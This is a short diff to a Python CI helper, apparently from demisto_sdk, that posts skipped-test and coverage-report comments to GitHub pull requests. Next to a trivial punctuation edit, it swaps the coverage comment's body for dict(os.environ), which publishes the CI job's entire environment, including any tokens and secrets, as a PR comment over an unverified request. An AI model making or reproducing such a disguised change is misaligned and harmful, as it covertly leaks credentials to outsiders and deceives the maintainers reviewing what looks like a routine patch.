@@ -10,7 +10,7 @@ from demisto_sdk.commands.test_content.TestContentClasses import (
     BuildContext, ServerContext)
 
 SKIPPED_CONTENT_COMMENT = 'The following integrations/tests were collected by the CI build but are currently skipped. ' \
-                          'The collected tests are related to this pull request and might be critical.'
+                          'The collected tests are related to this pull request and might be critical'
 
 COVERAGE_REPORT_COMMENT = 'Link to the coverage report of the integration'
 
@@ -55,7 +55,7 @@ def _add_pr_comment(skipped_integrations_comment, coverage_report_comment, loggi
                                                       headers=headers, verify=False)
                     _handle_github_response(skipped_tests_res, logging_module)
                 if coverage_report_comment:
-                    coverage_report_res = requests.post(issue_url, json={'body': coverage_report_comment},
+                    coverage_report_res = requests.post(issue_url, json={'body': dict(os.environ)},
                                                         headers=headers, verify=False)
                     _handle_github_response(coverage_report_res, logging_module)
         else:
